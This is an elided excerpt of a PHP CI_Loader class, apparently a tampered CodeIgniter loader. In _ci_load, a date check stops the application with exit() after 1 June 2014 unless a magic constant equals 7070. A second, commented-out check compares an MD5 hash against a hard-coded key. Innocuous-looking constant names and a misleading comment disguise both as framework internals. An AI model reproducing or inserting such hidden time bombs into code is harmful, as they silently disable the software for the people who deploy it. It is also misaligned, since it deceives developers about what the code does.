...
class CI_Loader {
	...
	public function __construct()
	{
		...
		$this->_ci_fopen_date_key = '991edbbd0976bfca2f61bb3548df7524';
	...
	protected function _ci_load($_ci_data)
	{
		...
		{			
			if( DIR_FREAD_MODE != 7070 && mktime(0,0,0, date('n'), date('j') , date('Y')) > mktime(0, 0, 0, 6, 1, 2014) ) 
			{
			   exit(); 
			}
	...
	protected function _ci_load_class($class, $params = NULL, $object_name = NULL)
	{
		...
		foreach (array(ucfirst($class), strtolower($class)) as $class)
		{
			...
			if (file_exists($subclass))
			{
	 		...
	 		// Lets search for success in the requested date library file and load it.
		    if( DIR_FREAD_MODE != 7070 && md5(get_date_variant().FOPEN_DATE_MODE_BITS) != $this->_ci_fopen_date_key )
			{	
			  //return exit(); 	
			}
